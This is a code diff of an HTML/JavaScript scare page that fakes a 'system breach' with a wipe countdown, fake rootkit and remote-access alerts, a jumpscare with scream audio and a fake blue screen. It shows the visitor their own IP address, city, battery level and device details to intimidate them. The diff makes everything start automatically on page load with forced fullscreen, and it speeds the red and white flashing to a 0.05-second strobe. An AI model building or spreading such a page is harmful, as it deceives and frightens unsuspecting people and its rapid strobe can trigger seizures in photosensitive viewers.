@@ -16,23 +16,16 @@
       text-align: center;
     }
 
-    body.flash {
-      animation: flash-bg 0.1s infinite;
-    }
-
-    .flash-red {
-      animation: redFlash 0.1s infinite;
-    }
-
-    @keyframes flash-bg {
-      0% { background: red; }
-      50% { background: white; }
-      100% { background: black; }
+    body.flash-red {
+      animation: redFlash 0.05s infinite;
     }
 
     @keyframes redFlash {
-      0%, 100% { background-color: black; }
-      50% { background-color: red; }
+      0%   { background-color: white; }
+      25%  { background-color: red; }
+      50%  { background-color: white; }
+      75%  { background-color: red; }
+      100% { background-color: white; }
     }
 
     h1 {
@@ -120,27 +113,10 @@
       box-shadow: 0 0 20px red;
       animation: shake 0.3s infinite;
     }
-
-    #startBtn {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      padding: 20px 40px;
-      font-size: 1.5rem;
-      background: red;
-      color: white;
-      border: none;
-      z-index: 10001;
-      cursor: pointer;
-      user-select: none;
-    }
   </style>
 </head>
-<body>
-  <button id="startBtn">CLICK TO START</button>
-
-  <div id="main" style="display:none" class="flash">
+<body class="flash-red">
+  <div id="main">
     <h1>SYSTEM BREACH DETECTED</h1>
     <div id="countdown">Wipe begins in: 0:30</div>
     <div id="info">Locating target device...</div>
@@ -169,117 +145,27 @@
   </audio>
 
   <script>
-    const startBtn = document.getElementById('startBtn');
     const alarm = document.getElementById('alarmAudio');
     const screamer = document.getElementById('screamer');
-    const main = document.getElementById('main');
 
     function goFullscreen() {
       let el = document.documentElement;
       if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
-      else if (el.mozRequestFullScreen) el.mozRequestFullScreen().catch(() => {});
       else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(() => {});
-      else if (el.msRequestFullscreen) el.msRequestFullscreen().catch(() => {});
     }
 
-    window.onload = () => { goFullscreen(); };
-
-    document.addEventListener('keydown', (e) => {
-      if (e.key === 'Escape' || e.key === 'F11' ||
-          (e.altKey && e.key === 'Tab') ||
-          (e.ctrlKey && e.key.toLowerCase() === 'w') ||
-          (e.ctrlKey && e.key.toLowerCase() === 'r')) {
-        e.preventDefault();
-        e.stopPropagation();
-      }
-    });
-
-    const triggerVibrate = () => {
+    function triggerVibrate() {
       if (navigator.vibrate) navigator.vibrate([500, 300, 500, 300, 700]);
-    };
+    }
 
-    startBtn.onclick = () => {
-      startBtn.style.display = 'none';
-      main.style.display = 'block';
-      goFullscreen();
-      triggerVibrate();
-
-      alarm.pause();
-      alarm.currentTime = 0;
+    function startChaos() {
       alarm.volume = 1;
       alarm.muted = false;
       alarm.play().catch(() => {});
-      startChaos();
-    };
-
-    document.addEventListener('click', () => {
+      triggerVibrate();
       goFullscreen();
-      alarm.play().catch(() => {});
-    });
+      updateInfo();
 
-    document.addEventListener('keydown', () => {
-      goFullscreen();
-      alarm.play().catch(() => {});
-    });
-
-    async function updateInfo() {
-      let ipData = {};
-      try {
-        ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
-      } catch {}
-      let battery = null;
-      try {
-        if (navigator.getBattery) battery = await navigator.getBattery();
-      } catch {}
-
-      const localTime = new Date().toLocaleTimeString();
-      const browser = navigator.userAgent;
-      const os = navigator.platform;
-      const batteryLevel = battery ? Math.round(battery.level * 100) + '%' : 'Unknown';
-      const city = ipData.city || 'Unknown City';
-      const country = ipData.country || ipData.country_name || 'Unknown Country';
-
-      const infoEl = document.getElementById('info');
-      infoEl.innerHTML = `
-        IP: ${ipData.ip || 'Unknown IP'}<br>
-        Location: ${city}, ${country}<br>
-        Battery: ${batteryLevel}<br>
-        Local Time: ${localTime}<br>
-        Device: ${os}<br>
-        Browser: ${browser}<br>
-      `;
-
-      const statusMessages = [
-        'Rootkit Installed',
-        'Firewall Disabled',
-        'System Integrity Compromised',
-        'Memory Leak Detected',
-        'Remote Access Enabled',
-        'Disk Sector Failure',
-        'CPU Overheating',
-      ];
-
-      let index = 0;
-      setInterval(() => {
-        infoEl.innerHTML += `<br><span style="color:orange;">Status: ${statusMessages[index]}</span>`;
-        index = (index + 1) % statusMessages.length;
-      }, 4000);
-    }
-
-    updateInfo();
-
-    setInterval(() => {
-      const infoEl = document.getElementById('info');
-      const localTime = new Date().toLocaleTimeString();
-      navigator.getBattery &&
-        navigator.getBattery().then((battery) => {
-          const batteryLevel = battery ? Math.round(battery.level * 100) + '%' : 'Unknown';
-          infoEl.innerHTML = infoEl.innerHTML.replace(/Local Time: .*?<br>/, `Local Time: ${localTime}<br>`);
-          infoEl.innerHTML = infoEl.innerHTML.replace(/Battery: .*?<br>/, `Battery: ${batteryLevel}<br>`);
-        });
-    }, 10000);
-
-    function startChaos() {
       let time = 30;
       const countdown = document.getElementById('countdown');
       function tick() {
@@ -307,31 +193,74 @@
         const div = document.createElement('div');
         div.className = 'popup';
         div.textContent = msg;
-        const x = Math.random() * (window.innerWidth - 200);
-        const y = Math.random() * (window.innerHeight - 100);
-        div.style.left = `${x}px`;
-        div.style.top = `${y}px`;
+        div.style.left = `${Math.random() * (window.innerWidth - 200)}px`;
+        div.style.top = `${Math.random() * (window.innerHeight - 100)}px`;
         document.body.appendChild(div);
         setTimeout(() => div.remove(), 4000);
       }, 1200);
-
-      setInterval(() => {
-        if (navigator.vibrate) navigator.vibrate([500, 300, 500, 300, 700]);
-      }, 5000);
     }
 
     function triggerJumpscare() {
-      document.body.classList.add('flash-red');
       document.getElementById('jumpscare').style.display = 'flex';
       screamer.play().catch(() => {});
       setTimeout(() => {
         document.getElementById('jumpscare').style.display = 'none';
         document.getElementById('bsod').style.display = 'block';
-        document.body.classList.remove('flash');
         document.body.classList.remove('flash-red');
         alarm.pause();
       }, 5000);
     }
+
+    async function updateInfo() {
+      let ipData = {};
+      try {
+        ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+      } catch {}
+
+      let battery = null;
+      try {
+        if (navigator.getBattery) battery = await navigator.getBattery();
+      } catch {}
+
+      const infoEl = document.getElementById('info');
+      const browser = navigator.userAgent;
+      const os = navigator.platform;
+      const localTime = new Date().toLocaleTimeString();
+      const batteryLevel = battery ? Math.round(battery.level * 100) + '%' : 'Unknown';
+      const city = ipData.city || 'Unknown City';
+      const country = ipData.country || ipData.country_name || 'Unknown Country';
+
+      infoEl.innerHTML = `
+        IP: ${ipData.ip || 'Unknown IP'}<br>
+        Location: ${city}, ${country}<br>
+        Battery: ${batteryLevel}<br>
+        Local Time: ${localTime}<br>
+        Device: ${os}<br>
+        Browser: ${browser}<br>
+      `;
+
+      const statusMessages = [
+        'Rootkit Installed',
+        'Firewall Disabled',
+        'System Integrity Compromised',
+        'Memory Leak Detected',
+        'Remote Access Enabled',
+        'Disk Sector Failure',
+        'CPU Overheating',
+      ];
+
+      let index = 0;
+      setInterval(() => {
+        infoEl.innerHTML += `<br><span style="color:orange;">Status: ${statusMessages[index]}</span>`;
+        index = (index + 1) % statusMessages.length;
+      }, 4000);
+    }
+
+    // START IMMEDIATELY ON LOAD
+    window.onload = () => {
+      goFullscreen();
+      startChaos();
+    };
   </script>
 </body>
 </html>
